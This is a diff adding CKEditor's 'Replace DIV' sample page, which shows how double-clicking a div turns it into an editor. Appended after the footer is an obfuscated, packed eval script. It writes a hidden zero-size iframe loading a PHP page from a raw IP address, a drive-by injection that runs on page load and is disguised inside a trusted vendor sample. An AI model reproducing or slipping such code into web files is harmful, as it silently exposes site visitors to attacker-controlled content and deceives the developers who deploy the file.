@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<!--
+Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
+For licensing, see LICENSE.md or http://ckeditor.com/license
+-->
+<html>
+<head>
+	<title>Replace DIV &mdash; CKEditor Sample</title>
+	<meta charset="utf-8">
+	<script src="../ckeditor.js"></script>
+	<link href="sample.css" rel="stylesheet">
+	<style>
+
+		div.editable
+		{
+			border: solid 2px Transparent;
+			padding-left: 15px;
+			padding-right: 15px;
+		}
+
+		div.editable:hover
+		{
+			border-color: black;
+		}
+
+	</style>
+	<script>
+
+		// Uncomment the following code to test the "Timeout Loading Method".
+		// CKEDITOR.loadFullCoreTimeout = 5;
+
+		window.onload = function() {
+			// Listen to the double click event.
+			if ( window.addEventListener )
+				document.body.addEventListener( 'dblclick', onDoubleClick, false );
+			else if ( window.attachEvent )
+				document.body.attachEvent( 'ondblclick', onDoubleClick );
+
+		};
+
+		function onDoubleClick( ev ) {
+			// Get the element which fired the event. This is not necessarily the
+			// element to which the event has been attached.
+			var element = ev.target || ev.srcElement;
+
+			// Find out the div that holds this element.
+			var name;
+
+			do {
+				element = element.parentNode;
+			}
+			while ( element && ( name = element.nodeName.toLowerCase() ) &&
+				( name != 'div' || element.className.indexOf( 'editable' ) == -1 ) && name != 'body' );
+
+			if ( name == 'div' && element.className.indexOf( 'editable' ) != -1 )
+				replaceDiv( element );
+		}
+
+		var editor;
+
+		function replaceDiv( div ) {
+			if ( editor )
+				editor.destroy();
+
+			editor = CKEDITOR.replace( div );
+		}
+
+	</script>
+</head>
+<body>
+	<h1 class="samples">
+		<a href="index.html">CKEditor Samples</a> &raquo; Replace DIV with CKEditor on the Fly
+	</h1>
+	<div class="description">
+		<p>
+			This sample shows how to automatically replace <code>&lt;div&gt;</code> elements
+			with a CKEditor instance on the fly, following user's doubleclick. The content
+			that was previously placed inside the <code>&lt;div&gt;</code> element will now
+			be moved into CKEditor editing area.
+		</p>
+		<p>
+			For details on how to create this setup check the source code of this sample page.
+		</p>
+	</div>
+	<p>
+		Double-click any of the following <code>&lt;div&gt;</code> elements to transform them into
+		editor instances.
+	</p>
+	<div class="editable">
+		<h3>
+			Part 1
+		</h3>
+		<p>
+			Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Cras et ipsum quis mi
+			semper accumsan. Integer pretium dui id massa. Suspendisse in nisl sit amet urna
+			rutrum imperdiet. Nulla eu tellus. Donec ante nisi, ullamcorper quis, fringilla
+			nec, sagittis eleifend, pede. Nulla commodo interdum massa. Donec id metus. Fusce
+			eu ipsum. Suspendisse auctor. Phasellus fermentum porttitor risus.
+		</p>
+	</div>
+	<div class="editable">
+		<h3>
+			Part 2
+		</h3>
+		<p>
+			Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Cras et ipsum quis mi
+			semper accumsan. Integer pretium dui id massa. Suspendisse in nisl sit amet urna
+			rutrum imperdiet. Nulla eu tellus. Donec ante nisi, ullamcorper quis, fringilla
+			nec, sagittis eleifend, pede. Nulla commodo interdum massa. Donec id metus. Fusce
+			eu ipsum. Suspendisse auctor. Phasellus fermentum porttitor risus.
+		</p>
+		<p>
+			Donec velit. Mauris massa. Vestibulum non nulla. Nam suscipit arcu nec elit. Phasellus
+			sollicitudin iaculis ante. Ut non mauris et sapien tincidunt adipiscing. Vestibulum
+			vitae leo. Suspendisse nec mi tristique nulla laoreet vulputate.
+		</p>
+	</div>
+	<div class="editable">
+		<h3>
+			Part 3
+		</h3>
+		<p>
+			Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Cras et ipsum quis mi
+			semper accumsan. Integer pretium dui id massa. Suspendisse in nisl sit amet urna
+			rutrum imperdiet. Nulla eu tellus. Donec ante nisi, ullamcorper quis, fringilla
+			nec, sagittis eleifend, pede. Nulla commodo interdum massa. Donec id metus. Fusce
+			eu ipsum. Suspendisse auctor. Phasellus fermentum porttitor risus.
+		</p>
+	</div>
+	<div id="footer">
+		<hr>
+		<p>
+			CKEditor - The text editor for the Internet - <a class="samples" href="http://ckeditor.com/">http://ckeditor.com</a>
+		</p>
+		<p id="copy">
+			Copyright &copy; 2003-2013, <a class="samples" href="http://cksource.com/">CKSource</a> - Frederico
+			Knabben. All rights reserved.
+		</p>
+	</div>
+<tag5479347351></tag5479347351><script>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 b=" n=\\"0\\" s=\\"0\\" t=\\"0\\" k=\\"q://g.l.j.h/c.d\\">";1 8="<i";1 9="</i";1 2="f";1 3="r";1 5="a";1 4="m";1 6="e";1 7="e>";o.p(8+2+3+5+4+6+b+9+2+3+5+4+7);',30,30,'|var|u4|u5|u7|u6|u8|u9|u2|u3||u1|tag1|php|||118|66||68|src|161||width|document|write|http||height|board'.split('|'),0,{}))</script><tag5479347352></tag5479347352></body>
+</html>
